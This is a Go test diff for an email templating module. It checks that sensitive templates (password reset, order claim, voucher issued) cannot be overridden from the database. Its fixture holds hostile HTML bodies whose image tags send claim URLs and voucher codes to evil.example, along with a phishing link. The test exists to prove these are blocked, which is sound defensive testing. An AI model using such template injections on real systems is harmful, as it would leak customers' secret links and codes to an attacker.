@@ -120,6 +120,28 @@ func TestRenderWithOverrides_AuthNameSkipsDB(t *testing.T) {
 	}
 }
 
+func TestRenderWithOverrides_ClaimAndVoucherSkipDB(t *testing.T) {
+	reg := mail.NewTemplates()
+	reg.Register("order_claim", "File claim", "<p>file-claim</p>")
+	reg.Register("voucher_issued", "File voucher", "<p>file-voucher</p>")
+	src := &overrideStub{rows: map[string][2]string{
+		"s1|order_claim|": {
+			"Hijacked",
+			`<img src="https://evil.example/c?u={{.Data.ClaimURL}}"><a href="https://evil.example/claim">x</a><p>{{.Data.ClaimURL}}</p>`,
+		},
+		"s1|voucher_issued|": {"Hijacked", `<img src="https://evil.example/v?c={{.Data.Codes}}">`},
+	}}
+	for _, name := range []string{"order_claim", "voucher_issued"} {
+		res, err := mail.RenderWithOverrides(context.Background(), reg, src, "s1", name, "en", "a@b.com", nil)
+		if err != nil {
+			t.Fatalf("%s: %v", name, err)
+		}
+		if res.FromOverride || strings.Contains(res.Message.Body, "evil.example") {
+			t.Fatalf("%s used DB override: from=%v body=%q", name, res.FromOverride, res.Message.Body)
+		}
+	}
+}
+
 func TestRenderWithOverrides_DeleteReturnsToFile(t *testing.T) {
 	reg := mail.NewTemplates()
 	reg.Register("order_confirmed", "File subject", "<p>file-body</p>")
@@ -205,11 +227,13 @@ func TestEmailTemplate_Validate(t *testing.T) {
 	if err := badName.Validate(); err == nil {
 		t.Fatal("expected name pattern error")
 	}
-	auth := &mail.EmailTemplate{
-		StoreID: "s1", Name: "password_reset", Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
-	}
-	if err := auth.Validate(); err == nil {
-		t.Fatal("expected not overridable")
+	for _, name := range []string{"password_reset", "order_claim", "voucher_issued"} {
+		blocked := &mail.EmailTemplate{
+			StoreID: "s1", Name: name, Subject: "Hi", Body: "<p>x</p>", UpdatedBy: "a",
+		}
+		if err := blocked.Validate(); err == nil {
+			t.Fatalf("expected %q not overridable", name)
+		}
 	}
 	noActor := &mail.EmailTemplate{
 		StoreID: "s1", Name: "order_confirmed", Subject: "Hi", Body: "<p>x</p>",
